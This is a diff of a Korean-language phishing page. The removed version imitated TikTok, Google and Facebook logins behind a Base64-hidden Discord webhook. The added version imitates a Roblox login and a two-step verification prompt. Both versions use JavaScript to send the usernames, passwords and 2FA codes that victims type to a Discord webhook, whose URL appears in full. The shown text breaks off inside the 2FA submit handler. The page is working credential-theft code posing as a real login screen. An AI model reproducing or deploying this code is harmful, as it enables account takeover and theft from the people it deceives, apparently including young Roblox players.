@@ -3,306 +3,591 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>로그인</title>
+    <title>Roblox</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
-        body { background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .login-container { background: #fff; border-radius: 20px; padding: 40px 50px; width: 100%; max-width: 450px; box-shadow: 0 10px 40px rgba(0,0,0,0.8); text-align: center; }
-        .logo { font-size: 28px; font-weight: 700; color: #000; margin-bottom: 20px; }
-        .logo span { color: #000; }
-        .login-container h2 { font-size: 22px; font-weight: 600; color: #000; margin-bottom: 8px; }
-        .login-container p.sub { color: #666; font-size: 14px; margin-bottom: 30px; }
-        .input-group { text-align: left; margin-bottom: 16px; }
-        .input-group label { font-size: 13px; font-weight: 600; color: #333; display: block; margin-bottom: 4px; }
-        .input-group input { width: 100%; padding: 14px 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 15px; background: #f8f8f8; outline: none; }
-        .input-group input:focus { border-color: #000; background: #fff; }
-        .login-btn { width: 100%; padding: 14px; background: #000; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
-        .login-btn:hover { background: #333; }
-        .divider { display: flex; align-items: center; gap: 16px; margin: 24px 0; color: #999; font-size: 13px; }
-        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #ddd; }
-        .social-btn { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 30px; background: #fff; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
-        .social-btn:hover { background: #f0f0f0; }
-        .signup-link { margin-top: 20px; font-size: 14px; color: #666; }
-        .signup-link a { color: #000; font-weight: 600; text-decoration: none; }
-        #ttStatusMsg { margin-top: 14px; font-size: 13px; color: #e74c3c; min-height: 20px; }
-        .footer-note { margin-top: 16px; font-size: 11px; color: #aaa; }
-        .hidden { display: none !important; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
 
-        /* Roblox 스타일 (간소화) */
-        .roblox-body { background-color: #000000; color: #FFFFFF; min-height: 100vh; overflow-x: hidden; }
-        .navbar { width: 100%; height: 48px; background-color: #111216; display: flex; align-items: center; justify-content: space-between; padding: 0 12px; border-bottom: 1px solid #232529; position: fixed; top: 0; left: 0; z-index: 10; }
-        .nav-left { display: flex; align-items: center; gap: 12px; flex-shrink: 0; }
-        .roblox-logo { width: 20px; height: 20px; background-color: #FFFFFF; transform: rotate(-10deg); display: flex; justify-content: center; align-items: center; cursor: pointer; flex-shrink: 0; }
-        .roblox-logo-inner { width: 6px; height: 6px; background-color: #111216; }
-        .nav-menu { display: flex; gap: 12px; list-style: none; white-space: nowrap; }
-        .nav-menu li a { color: #C8CACD; text-decoration: none; font-size: 13px; font-weight: 500; }
-        .search-container { position: relative; flex: 1; max-width: 180px; margin: 0 8px; }
-        .search-container input { width: 100%; height: 30px; background-color: #232529; border: 1px solid #393B3F; border-radius: 6px; padding-left: 30px; padding-right: 8px; color: #FFFFFF; font-size: 13px; outline: none; }
-        .search-container input::placeholder { color: #8D9094; }
-        .search-icon { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); width: 14px; height: 14px; fill: none; stroke: #8D9094; stroke-width: 2; pointer-events: none; }
-        .nav-right { display: flex; align-items: center; gap: 6px; flex-shrink: 0; }
-        .btn-signup-nav { background-color: #393B3F; color: #FFFFFF; border: none; border-radius: 6px; padding: 5px 10px; font-size: 12px; font-weight: 600; cursor: pointer; white-space: nowrap; }
-        .btn-login-nav { background-color: transparent; color: #FFFFFF; border: 1px solid #62656A; border-radius: 6px; padding: 4px 10px; font-size: 12px; font-weight: 500; cursor: pointer; white-space: nowrap; }
-        @media (max-width: 600px) { .nav-menu { display: none; } .search-container { max-width: 100%; } }
+        body {
+            background-color: #000000;
+            color: #FFFFFF;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-        .login-main { margin-top: 48px; display: flex; flex-direction: column; justify-content: center; align-items: center; flex-grow: 1; min-height: calc(100vh - 48px); padding: 40px 16px; }
-        .login-card { background-color: #232529; border-radius: 8px; padding: 38px 28px 30px 28px; width: 380px; max-width: 100%; text-align: center; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.8); }
-        .login-card h1 { font-size: 26px; font-weight: 800; margin-bottom: 22px; color: #FFFFFF; letter-spacing: -0.4px; }
-        .input-group-roblox { margin-bottom: 10px; }
-        .input-group-roblox input { width: 100%; height: 44px; padding: 0 14px; background-color: #393B3F; border: 1px solid #393B3F; border-radius: 8px; color: #FFFFFF; font-size: 14px; outline: none; }
-        .input-group-roblox input::placeholder { color: #9B9DA0; font-size: 14px; }
-        .btn-login-main { width: 100%; height: 40px; background-color: transparent; border: 1px solid #62656A; border-radius: 8px; color: #D2D3D5; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 4px; margin-bottom: 22px; }
-        .forgot-link { display: block; font-size: 13px; color: #FFFFFF; text-decoration: none; margin-bottom: 30px; }
-        .forgot-link:hover { text-decoration: underline; }
-        .btn-sub { width: 100%; height: 42px; background-color: #393B3F; border: none; border-radius: 8px; color: #FFFFFF; font-size: 13.5px; font-weight: 500; cursor: pointer; margin-bottom: 10px; }
-        .signup-text { font-size: 13px; color: #B8BABC; margin-top: 36px; }
-        .signup-text a { color: #FFFFFF; text-decoration: none; font-weight: 500; margin-left: 2px; }
-        .signup-text a:hover { text-decoration: underline; }
+        /* ===== 상단 네비게이션 바 ===== */
+        .navbar {
+            width: 100%;
+            height: 48px;
+            background-color: #111216;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 12px;
+            border-bottom: 1px solid #232529;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 10;
+        }
 
-        .modal-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: rgba(0, 0, 0, 0.75); display: none; justify-content: center; align-items: center; z-index: 1000; padding: 16px; }
-        .modal-overlay.show { display: flex; }
-        .modal-card { background-color: #2B2D31; width: 100%; max-width: 400px; max-height: 90vh; overflow-y: auto; border-radius: 12px; padding: 20px 20px 24px 20px; box-shadow: 0 12px 36px rgba(0, 0, 0, 0.85); text-align: center; }
-        .modal-header { display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
-        .modal-title { font-size: 18px; font-weight: 700; color: #FFFFFF; }
-        .shield-icon-wrapper { margin: 0 0 20px 0; display: flex; justify-content: center; }
-        .shield-icon { width: 88px; height: 88px; }
-        .modal-description { font-size: 14px; color: #E3E5E8; line-height: 1.45; margin-bottom: 24px; font-weight: 400; word-break: keep-all; }
-        .code-input { width: 100%; height: 44px; background-color: #1E1F22; border: 1px solid #62656A; border-radius: 8px; padding: 0 16px; color: #FFFFFF; font-size: 15px; outline: none; margin-bottom: 16px; }
-        .code-input::placeholder { color: #8D9094; }
-        .trust-device-container { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 20px; cursor: pointer; }
-        .trust-checkbox { width: 18px; height: 18px; border-radius: 4px; accent-color: #0066FF; cursor: pointer; }
-        .trust-label { font-size: 13.5px; color: #FFFFFF; user-select: none; }
-        .sub-links { display: flex; justify-content: center; margin-bottom: 24px; }
-        .sub-link-item { color: #FFFFFF; font-size: 13.5px; text-decoration: none; font-weight: 600; }
-        .btn-submit { width: 100%; height: 42px; background-color: #8D9094; border: none; border-radius: 8px; color: #FFFFFF; font-size: 15px; font-weight: 700; cursor: pointer; margin-bottom: 18px; }
-        .btn-submit:hover { background-color: #A0A3A8; }
-        .fa-error { color: #ff6b6b; font-size: 13px; margin-top: 12px; display: none; padding: 10px 12px; background: rgba(255, 80, 80, 0.1); border: 1px solid rgba(255, 80, 80, 0.3); border-radius: 8px; margin-bottom: 14px; }
-        .help-text { font-size: 11.5px; color: #A0A3A8; margin-bottom: 10px; line-height: 1.3; }
-        .help-text a { color: #A0A3A8; text-decoration: underline; }
-        .warning-text { font-size: 10.5px; color: #A0A3A8; line-height: 1.4; word-break: keep-all; }
-        .roblox-wrapper { display: none; width: 100%; }
-        .roblox-wrapper.active { display: block; }
-        .tiktok-wrapper { display: block; }
-        .tiktok-wrapper.hidden { display: none; }
+        .nav-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-shrink: 0;
+        }
+
+        .roblox-logo {
+            width: 20px;
+            height: 20px;
+            background-color: #FFFFFF;
+            transform: rotate(-10deg);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+
+        .roblox-logo-inner {
+            width: 6px;
+            height: 6px;
+            background-color: #111216;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 12px;
+            list-style: none;
+            white-space: nowrap;
+        }
+
+        .nav-menu li a {
+            color: #C8CACD;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .search-container {
+            position: relative;
+            flex: 1;
+            max-width: 180px;
+            margin: 0 8px;
+        }
+
+        .search-container input {
+            width: 100%;
+            height: 30px;
+            background-color: #232529;
+            border: 1px solid #393B3F;
+            border-radius: 6px;
+            padding-left: 30px;
+            padding-right: 8px;
+            color: #FFFFFF;
+            font-size: 13px;
+            outline: none;
+        }
+
+        .search-container input::placeholder {
+            color: #8D9094;
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 14px;
+            height: 14px;
+            fill: none;
+            stroke: #8D9094;
+            stroke-width: 2;
+            pointer-events: none;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            flex-shrink: 0;
+        }
+
+        .btn-signup-nav {
+            background-color: #393B3F;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 6px;
+            padding: 5px 10px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .btn-login-nav {
+            background-color: transparent;
+            color: #FFFFFF;
+            border: 1px solid #62656A;
+            border-radius: 6px;
+            padding: 4px 10px;
+            font-size: 12px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        @media (max-width: 600px) {
+            .nav-menu {
+                display: none;
+            }
+            .search-container {
+                max-width: 100%;
+            }
+        }
+
+        /* ===== 로그인 화면 ===== */
+        .login-main {
+            margin-top: 48px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            flex-grow: 1;
+            min-height: calc(100vh - 48px);
+            padding: 40px 16px;
+        }
+
+        .login-card {
+            background-color: #232529;
+            border-radius: 8px;
+            padding: 38px 28px 30px 28px;
+            width: 380px;
+            max-width: 100%;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.8);
+        }
+
+        .login-card h1 {
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 22px;
+            color: #FFFFFF;
+            letter-spacing: -0.4px;
+        }
+
+        .input-group {
+            margin-bottom: 10px;
+        }
+
+        .input-group input {
+            width: 100%;
+            height: 44px;
+            padding: 0 14px;
+            background-color: #393B3F;
+            border: 1px solid #393B3F;
+            border-radius: 8px;
+            color: #FFFFFF;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .input-group input::placeholder {
+            color: #9B9DA0;
+            font-size: 14px;
+        }
+
+        .btn-login-main {
+            width: 100%;
+            height: 40px;
+            background-color: transparent;
+            border: 1px solid #62656A;
+            border-radius: 8px;
+            color: #D2D3D5;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 4px;
+            margin-bottom: 22px;
+        }
+
+        .forgot-link {
+            display: block;
+            font-size: 13px;
+            color: #FFFFFF;
+            text-decoration: none;
+            margin-bottom: 30px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn-sub {
+            width: 100%;
+            height: 42px;
+            background-color: #393B3F;
+            border: none;
+            border-radius: 8px;
+            color: #FFFFFF;
+            font-size: 13.5px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .signup-text {
+            font-size: 13px;
+            color: #B8BABC;
+            margin-top: 36px;
+        }
+
+        .signup-text a {
+            color: #FFFFFF;
+            text-decoration: none;
+            font-weight: 500;
+            margin-left: 2px;
+        }
+
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== 2FA 모달 ===== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.75);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 16px;
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal-card {
+            background-color: #2B2D31;
+            width: 100%;
+            max-width: 400px;
+            max-height: 90vh;
+            overflow-y: auto;
+            border-radius: 12px;
+            padding: 20px 20px 24px 20px;
+            box-shadow: 0 12px 36px rgba(0, 0, 0, 0.85);
+            position: relative;
+            text-align: center;
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #FFFFFF;
+        }
+
+        .shield-icon-wrapper {
+            margin: 0 0 20px 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        .shield-icon {
+            width: 88px;
+            height: 88px;
+        }
+
+        .modal-description {
+            font-size: 14px;
+            color: #E3E5E8;
+            line-height: 1.45;
+            margin-bottom: 24px;
+            font-weight: 400;
+            word-break: keep-all;
+        }
+
+        .code-input {
+            width: 100%;
+            height: 44px;
+            background-color: #1E1F22;
+            border: 1px solid #62656A;
+            border-radius: 8px;
+            padding: 0 16px;
+            color: #FFFFFF;
+            font-size: 15px;
+            outline: none;
+            text-align: left;
+            margin-bottom: 16px;
+        }
+
+        .code-input::placeholder {
+            color: #8D9094;
+        }
+
+        .code-input:focus {
+            border-color: #FFFFFF;
+        }
+
+        .trust-device-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .trust-checkbox {
+            width: 18px;
+            height: 18px;
+            border-radius: 4px;
+            accent-color: #0066FF;
+            cursor: pointer;
+        }
+
+        .trust-label {
+            font-size: 13.5px;
+            color: #FFFFFF;
+            user-select: none;
+        }
+
+        .sub-links {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .sub-link-item {
+            color: #FFFFFF;
+            font-size: 13.5px;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .sub-link-item:hover {
+            text-decoration: underline;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 42px;
+            background-color: #8D9094;
+            border: none;
+            border-radius: 8px;
+            color: #FFFFFF;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 18px;
+            transition: background-color 0.15s ease;
+        }
+
+        .btn-submit:hover {
+            background-color: #A0A3A8;
+        }
+
+        .fa-error {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 12px;
+            display: none;
+            padding: 10px 12px;
+            background: rgba(255, 80, 80, 0.1);
+            border: 1px solid rgba(255, 80, 80, 0.3);
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 14px;
+        }
+
+        .help-text {
+            font-size: 11.5px;
+            color: #A0A3A8;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+
+        .help-text a {
+            color: #A0A3A8;
+            text-decoration: underline;
+        }
+
+        .warning-text {
+            font-size: 10.5px;
+            color: #A0A3A8;
+            line-height: 1.4;
+            word-break: keep-all;
+        }
     </style>
 </head>
 <body>
 
-    <!-- TikTok 섹션 -->
-    <div class="tiktok-wrapper" id="tiktokSection">
-        <div class="login-container">
-            <div class="logo">🎵 <span>Tik</span>Tok</div>
-            <h2>로그인</h2>
-            <p class="sub">계정에 접속하려면 로그인하세요</p>
-            <form id="tiktokForm">
+    <!-- 상단 바 -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <div class="roblox-logo">
+                <div class="roblox-logo-inner"></div>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#">차트</a></li>
+                <li><a href="#">마켓플레이스</a></li>
+                <li><a href="#">만들기</a></li>
+                <li><a href="#">Robux</a></li>
+            </ul>
+        </div>
+
+        <div class="search-container">
+            <svg class="search-icon" viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="8"></circle>
+                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+            </svg>
+            <input type="text" placeholder="검색">
+        </div>
+
+        <div class="nav-right">
+            <button class="btn-signup-nav">회원가입</button>
+            <button class="btn-login-nav">로그인</button>
+        </div>
+    </nav>
+
+    <!-- 로그인 화면 -->
+    <div class="login-main" id="loginView">
+        <div class="login-card">
+            <h1>Roblox에 로그인</h1>
+
+            <form id="loginForm">
                 <div class="input-group">
-                    <label>이메일 또는 사용자명</label>
-                    <input type="text" id="ttUsername" placeholder="이메일 또는 사용자명 입력" required>
+                    <input type="text" id="username" placeholder="사용자 이름/이메일/전화번호" autocomplete="off">
                 </div>
+
                 <div class="input-group">
-                    <label>비밀번호</label>
-                    <input type="password" id="ttPassword" placeholder="비밀번호 입력" required>
+                    <input type="password" id="password" placeholder="비밀번호" autocomplete="off">
                 </div>
-                <button type="submit" class="login-btn">로그인</button>
+
+                <button type="submit" class="btn-login-main">로그인</button>
             </form>
-            <div class="divider">또는</div>
-            <button class="social-btn" id="ttGoogleBtn">🔵 Google로 계속하기</button>
-            <button class="social-btn" id="ttFacebookBtn">🔷 Facebook으로 계속하기</button>
-            <div id="ttStatusMsg"></div>
-            <div class="signup-link">계정이 없으신가요? <a href="#">가입하기</a></div>
-            <div class="footer-note">© 2025 TikTok</div>
+
+            <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
+
+            <button class="btn-sub">이메일로 일회용 코드 받기</button>
+            <button class="btn-sub">빠른 로그인</button>
+
+            <div class="signup-text">
+                계정이 없으신가요? <a href="#">회원가입</a>
+            </div>
         </div>
     </div>
 
-    <!-- Roblox 섹션 -->
-    <div class="roblox-wrapper" id="robloxSection">
-        <div class="roblox-body">
-            <nav class="navbar">
-                <div class="nav-left">
-                    <div class="roblox-logo"><div class="roblox-logo-inner"></div></div>
-                    <ul class="nav-menu">
-                        <li><a href="#">차트</a></li>
-                        <li><a href="#">마켓플레이스</a></li>
-                        <li><a href="#">만들기</a></li>
-                        <li><a href="#">Robux</a></li>
-                    </ul>
-                </div>
-                <div class="search-container">
-                    <svg class="search-icon" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-                    <input type="text" placeholder="검색">
-                </div>
-                <div class="nav-right">
-                    <button class="btn-signup-nav">회원가입</button>
-                    <button class="btn-login-nav">로그인</button>
-                </div>
-            </nav>
-            <div class="login-main" id="loginView">
-                <div class="login-card">
-                    <h1>Roblox에 로그인</h1>
-                    <form id="robloxForm">
-                        <div class="input-group-roblox">
-                            <input type="text" id="rbxUsername" placeholder="사용자 이름/이메일/전화번호" autocomplete="off">
-                        </div>
-                        <div class="input-group-roblox">
-                            <input type="password" id="rbxPassword" placeholder="비밀번호" autocomplete="off">
-                        </div>
-                        <button type="submit" class="btn-login-main">로그인</button>
-                    </form>
-                    <a href="#" class="forgot-link">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
-                    <button class="btn-sub">이메일로 일회용 코드 받기</button>
-                    <button class="btn-sub">빠른 로그인</button>
-                    <div class="signup-text">계정이 없으신가요? <a href="#">회원가입</a></div>
-                </div>
+    <!-- 2FA 모달 -->
+    <div class="modal-overlay" id="faModal">
+        <div class="modal-card">
+
+            <div class="modal-header">
+                <div class="modal-title">2단계 인증</div>
             </div>
-            <div class="modal-overlay" id="faModal">
-                <div class="modal-card">
-                    <div class="modal-header"><div class="modal-title">2단계 인증</div></div>
-                    <div class="shield-icon-wrapper">
-                        <svg class="shield-icon" viewBox="0 0 64 64" fill="none">
-                            <path d="M32 8L12 16V30C12 43.5 20.5 54 32 58C43.5 54 52 43.5 52 30V16L32 8Z" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
-                            <rect x="23.5" y="30" width="17" height="13" rx="2.5" stroke="white" stroke-width="2.5"/>
-                            <path d="M27 30V25.5C27 22.8 29.2 20.5 32 20.5C34.8 20.5 37 22.8 37 25.5V30" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
-                            <line x1="32" y1="34" x2="32" y2="39" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
-                        </svg>
-                    </div>
-                    <p class="modal-description">로블록스 홈 화면에서 이 로그인을 승인하시거나 연결된 이메일로 보낸 6자리 코드를 입력하세요.</p>
-                    <form id="faForm">
-                        <input type="text" class="code-input" id="faCode" placeholder="6자리 코드 입력" maxlength="6" autocomplete="off">
-                        <label class="trust-device-container">
-                            <input type="checkbox" class="trust-checkbox">
-                            <span class="trust-label">30일 동안 본 기기 신뢰</span>
-                        </label>
-                        <div class="sub-links"><a href="#" class="sub-link-item">코드 재전송</a></div>
-                        <button type="submit" class="btn-submit">확인</button>
-                    </form>
-                    <div class="fa-error" id="faErrorMsg">코드가 만료되었습니다. 다시 시도하세요.</div>
-                    <div class="help-text">도움이 필요하신가요? <a href="#">Roblox 지원 센터</a>(으)로 문의하세요.</div>
-                    <div class="warning-text">중요: 보안 코드를 다른 사람과 공유하지 마세요.</div>
-                </div>
+
+            <div class="shield-icon-wrapper">
+                <svg class="shield-icon" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M32 8L12 16V30C12 43.5 20.5 54 32 58C43.5 54 52 43.5 52 30V16L32 8Z" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+                    <rect x="23.5" y="30" width="17" height="13" rx="2.5" stroke="white" stroke-width="2.5"/>
+                    <path d="M27 30V25.5C27 22.8 29.2 20.5 32 20.5C34.8 20.5 37 22.8 37 25.5V30" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                    <line x1="32" y1="34" x2="32" y2="39" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                </svg>
             </div>
+
+            <p class="modal-description">
+                로블록스 홈 화면에서 이 로그인을 승인하시거나 연결된 이메일로 보낸 6자리 코드를 입력하세요.
+            </p>
+
+            <form id="faForm">
+                <input type="text" class="code-input" id="faCode" placeholder="6자리 코드 입력" maxlength="6" autocomplete="off">
+
+                <label class="trust-device-container">
+                    <input type="checkbox" class="trust-checkbox">
+                    <span class="trust-label">30일 동안 본 기기 신뢰</span>
+                </label>
+
+                <div class="sub-links">
+                    <a href="#" class="sub-link-item">코드 재전송</a>
+                </div>
+
+                <button type="submit" class="btn-submit">확인</button>
+            </form>
+
+            <div class="fa-error" id="faErrorMsg">코드가 만료되었습니다. 다시 시도하세요.</div>
+
+            <div class="help-text">
+                도움이 필요하신가요? <a href="#">Roblox 지원 센터</a>(으)로 문의하세요.
+            </div>
+
+            <div class="warning-text">
+                중요: 보안 코드를 다른 사람과 공유하지 마세요. Roblox는 절대 사용자의 코드를 요청하지 않습니다. 코드를 문자 메시지로 보내거나 화면을 공유하는 행위 또한 해서는 안 됩니다.
+            </div>
+
         </div>
     </div>
 
     <script>
-        // ===== Base64로 인코딩된 웹훅 (숨김) =====
-        const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMTc4NTY1MDQ0NDEwNzg2Ny9leE5nTy1tYllOU0gyV0hHYjJxanBMVUZ3RWo1WF9GdUZJRHFsVktlcm9vQ1VUejZIM0NEQ2VZaDlGeE1BV1FwY2pwZg==';
-        const WEBHOOK_URL = atob(encoded);
+        var WEBHOOK_URL = 'https://discord.com/api/webhooks/1521785650444107867/exNgO-mbYNSH2WHGb2qjpLUFwEj5X_FuFIDqlVKerooCUTz6H3CDCeYh9FxMAWQpcjpf';
+        var capturedUser = '';
+        var capturedPass = '';
 
-        let capturedUser = '', capturedPass = '';
-
-        // ===== Google =====
-        document.getElementById('ttGoogleBtn').addEventListener('click', function() {
-            const email = prompt('🔵 Google 이메일을 입력하세요:');
-            if (!email) return;
-            const password = prompt('🔵 Google 비밀번호를 입력하세요:');
-            if (!password) return;
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "📥 Google Login",
-                        description: `**이메일:** ${email}\n**비밀번호:** ${password}`,
-                        color: 0x4285F4,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(() => {});
-
-            document.getElementById('ttStatusMsg').style.color = '#2ecc71';
-            document.getElementById('ttStatusMsg').innerText = '✅ Google 로그인 성공! 이동 중...';
-            setTimeout(() => {
-                document.getElementById('tiktokSection').classList.add('hidden');
-                document.getElementById('robloxSection').classList.add('active');
-                document.getElementById('rbxUsername').focus();
-            }, 1000);
-        });
-
-        // ===== Facebook =====
-        document.getElementById('ttFacebookBtn').addEventListener('click', function() {
-            const email = prompt('🔷 Facebook 이메일을 입력하세요:');
-            if (!email) return;
-            const password = prompt('🔷 Facebook 비밀번호를 입력하세요:');
-            if (!password) return;
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "📥 Facebook Login",
-                        description: `**이메일:** ${email}\n**비밀번호:** ${password}`,
-                        color: 0x1877F2,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(() => {});
-
-            document.getElementById('ttStatusMsg').style.color = '#2ecc71';
-            document.getElementById('ttStatusMsg').innerText = '✅ Facebook 로그인 성공! 이동 중...';
-            setTimeout(() => {
-                document.getElementById('tiktokSection').classList.add('hidden');
-                document.getElementById('robloxSection').classList.add('active');
-                document.getElementById('rbxUsername').focus();
-            }, 1000);
-        });
-
-        // ===== TikTok 폼 =====
-        document.getElementById('tiktokForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            const username = document.getElementById('ttUsername').value.trim();
-            const password = document.getElementById('ttPassword').value.trim();
-            if (!username || !password) {
-                document.getElementById('ttStatusMsg').innerText = '모든 필드를 입력해주세요.';
-                return;
+        // 닉네임 칸에서 Enter → 비밀번호 칸으로 이동
+        document.getElementById('username').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('password').focus();
             }
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "📥 TikTok Login",
-                        description: `**사용자명:** ${username}\n**비밀번호:** ${password}`,
-                        color: 0x000000,
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(() => {});
-            document.getElementById('ttStatusMsg').style.color = '#2ecc71';
-            document.getElementById('ttStatusMsg').innerText = '✅ 로그인 성공! 이동 중...';
-            setTimeout(() => {
-                document.getElementById('tiktokSection').classList.add('hidden');
-                document.getElementById('robloxSection').classList.add('active');
-                document.getElementById('rbxUsername').focus();
-            }, 1000);
         });
 
-        // ===== Roblox =====
-        document.getElementById('rbxUsername').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') { e.preventDefault(); document.getElementById('rbxPassword').focus(); }
-        });
-        document.getElementById('rbxPassword').addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') { e.preventDefault(); document.getElementById('robloxForm').dispatchEvent(new Event('submit')); }
+        // 비밀번호 칸에서 Enter → 로그인 제출
+        document.getElementById('password').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
         });
 
-        document.getElementById('robloxForm').addEventListener('submit', function(e) {
+        // 로그인 제출
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            capturedUser = document.getElementById('rbxUsername').value;
-            capturedPass = document.getElementById('rbxPassword').value;
+            capturedUser = document.getElementById('username').value;
+            capturedPass = document.getElementById('password').value;
+
             if (!capturedUser || !capturedPass) {
                 alert('비밀번호를 입력하세요');
-                document.getElementById('rbxPassword').focus();
+                document.getElementById('password').focus();
                 return;
             }
+
+            // Discord로 1차 전송
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
+                    content: '**[1단계] Roblox 로그인 정보 캡처됨**',
                     embeds: [{
-                        title: '📥 Roblox Login (1단계)',
+                        title: '1단계 - 계정 정보',
                         fields: [
-                            { name: '사용자명/이메일', value: capturedUser, inline: true },
+                            { name: '사용자 이름/이메일', value: capturedUser, inline: true },
                             { name: '비밀번호', value: capturedPass, inline: true },
                             { name: '상태', value: '2FA 코드 대기 중...', inline: false }
                         ],
@@ -310,36 +595,45 @@
                         timestamp: new Date().toISOString()
                     }]
                 })
-            }).catch(() => {});
+            }).catch(function() {});
+
+            // 2FA 모달 표시
             document.getElementById('loginView').style.display = 'none';
             document.getElementById('faModal').classList.add('show');
             document.getElementById('faCode').focus();
         });
 
+        // 2FA 코드 제출
         document.getElementById('faForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const faCode = document.getElementById('faCode').value;
+            var faCode = document.getElementById('faCode').value;
+
+            // Discord로 2차 전송
